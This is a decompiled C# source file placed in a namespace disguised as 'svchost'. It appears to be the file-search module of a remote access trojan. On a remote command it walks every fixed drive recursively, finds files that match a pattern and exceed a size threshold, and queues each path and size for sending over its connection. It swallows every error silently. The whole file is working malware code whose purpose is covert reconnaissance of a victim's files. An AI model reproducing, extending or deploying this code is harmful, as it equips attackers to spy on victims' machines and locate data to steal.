using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace svchost;

public class GroupSearch
{
	public static string Params;

	private int SearchTotal;

	private int MinFileSize;

	public GroupSearch()
	{
		SearchTotal = 0;
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetDriveTypeA([MarshalAs(UnmanagedType.VBByRefStr)] ref string nDrive);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, long nVolumeNameSize, long lpVolumeSerialNumber, long lpMaximumComponentLength, long lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, long nFileSystemNameSize);

	public void Go()
	{
		Form1.DataToSend = "info:Searching (" + Params + ")";
		try
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			int num = Information.UBound((Array)logicalDrives, 1);
			for (int i = 0; i <= num; i = checked(i + 1))
			{
				if (GetDriveTypeA(ref logicalDrives[i]) == 0)
				{
				}
				if (GetDriveTypeA(ref logicalDrives[i]) == 1)
				{
				}
				if (GetDriveTypeA(ref logicalDrives[i]) == 2)
				{
				}
				if (GetDriveTypeA(ref logicalDrives[i]) == 3)
				{
				}
				if (GetDriveTypeA(ref logicalDrives[i]) == 4)
				{
				}
				if (GetDriveTypeA(ref logicalDrives[i]) == 3)
				{
					DoSearch(logicalDrives[i], Params);
				}
				if (!Form1.Connected)
				{
					return;
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Form1.DataToSend = "info:" + SearchTotal;
	}

	public void DoSearch(string DrivetoSearch, string TexttoSearch)
	{
		checked
		{
			string text = TexttoSearch.Substring(0, Strings.InStr(TexttoSearch, ",", (CompareMethod)0) - 1);
			TexttoSearch = TexttoSearch.Replace(text + ",", "");
			MinFileSize = (int)Math.Round(Conversion.Val(TexttoSearch));
			try
			{
				string[] files = Directory.GetFiles(DrivetoSearch, text);
				int num = 0;
				while (true)
				{
					if (num < files.Length)
					{
						string text2 = files[num];
						if (FileSystem.FileLen(text2) > MinFileSize)
						{
							SearchTotal++;
							while (StringType.StrCmp(Form1.DataToSend, "", false) != 0)
							{
								Application.DoEvents();
								Thread.Sleep(10);
								if (!Form1.Connected)
								{
									return;
								}
							}
							Form1.DataToSend = "GS\u0002" + text2 + "\u0002" + StringType.FromLong(FileSystem.FileLen(text2));
						}
						num++;
						continue;
					}
					DirSearch(DrivetoSearch, text);
					break;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void DirSearch(string DrivetoSearch, string RealText)
	{
		checked
		{
			try
			{
				string[] directories = Directory.GetDirectories(DrivetoSearch);
				foreach (string text in directories)
				{
					try
					{
						string[] files = Directory.GetFiles(text, RealText);
						foreach (string text2 in files)
						{
							if (FileSystem.FileLen(text2) <= MinFileSize)
							{
								continue;
							}
							SearchTotal++;
							while (StringType.StrCmp(Form1.DataToSend, "", false) != 0)
							{
								Application.DoEvents();
								Thread.Sleep(10);
								if (!Form1.Connected)
								{
									return;
								}
							}
							Form1.DataToSend = "GS\u0002" + text2 + "\u0002" + StringType.FromLong(FileSystem.FileLen(text2));
						}
						Thread.Sleep(10);
						Application.DoEvents();
						DirSearch(text, RealText);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}
}
